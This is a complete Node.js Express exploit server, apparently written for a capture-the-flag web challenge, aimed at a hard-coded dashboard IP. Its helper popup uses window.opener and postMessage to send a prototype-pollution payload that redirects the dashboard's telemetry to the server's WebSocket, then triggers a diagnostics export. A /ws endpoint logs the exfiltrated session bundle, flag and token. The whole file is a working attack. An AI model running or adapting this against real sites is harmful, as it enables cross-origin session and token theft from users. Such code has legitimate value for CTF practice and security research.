const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;
const TARGET = 'http://34.118.127.209:35666/';

// ── GET / ── landing: open same-origin helper popup, then navigate self to dashboard
app.get('/', (req, res) => {
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
// 1. Open helper popup (HTTPS→HTTPS = guaranteed to load)
var h = window.open(location.origin + '/helper');
// 2. Navigate THIS window to the dashboard (top-level HTTPS→HTTP = allowed)
//    After this, helper's window.opener points to the dashboard
setTimeout(function(){ location.href = '${TARGET}'; }, 500);
</script>
</body></html>`);
});

// ── GET /helper ── same-origin popup that attacks window.opener (= dashboard)
app.get('/helper', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){
  try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}
}
L('helper_loaded');

function tryAttack(){
  if(!window.opener){L('no_opener');return false;}

  // Diagnostic: check if opener navigated cross-origin (= dashboard loaded)
  var crossOrigin=false;
  try{var x=window.opener.location.href;L('opener_sameorigin='+x);}
  catch(e){crossOrigin=true;L('opener_crossorigin');}

  var len=-1;
  try{len=window.opener.length;}catch(e){L('len_err');}
  L('opener.len='+len);

  // len=1 means dashboard loaded (it has 1 iframe)
  // But try even if len=0, in case iframe hasn't loaded yet
  if(!crossOrigin){return false;} // opener hasn't navigated to dashboard yet

  // Prototype pollution via JSON.parse (__proto__ = own data property)
  var inner=JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');
  window.opener.postMessage({type:'prefs:update',payload:{theme:inner}},'*');
  L('pollute_ok');

  setTimeout(function(){
    window.opener.postMessage({type:'diagnostics:export'},'*');
    L('trigger_ok');
  },500);
  return true;
}

// Poll: wait for dashboard to load, then attack repeatedly
var attempts=0;
var iv=setInterval(function(){
  attempts++;
  var ok=tryAttack();
  L('attempt_'+attempts+'_ok='+ok);
  if(attempts>=25)clearInterval(iv);
},1500);
</script>
</body></html>`);
});

// ── GET /log ── beacon logger
app.get('/log', (req, res) => {
  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
  console.log('[beacon]', decodeURIComponent(raw));
  res.status(204).end();
});

// ── WS /ws ── receive exfiltrated diagnostics bundle
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
